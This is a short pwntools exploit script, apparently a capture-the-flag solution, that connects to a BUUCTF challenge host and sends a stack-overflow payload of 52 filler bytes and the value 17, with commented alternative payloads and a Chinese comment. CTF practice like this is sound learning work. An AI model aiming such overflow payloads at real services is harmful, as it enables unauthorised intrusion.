from pwn import *

r = remote('node5.buuoj.cn', 28884)

payload = b'A' * 13 * 4 + p32(17)
# payload = p32(1) * 13 + p32(17)
# 方法2：全部填满为17
# payload = p32(17) * 14

r.sendline(payload)
r.interactive()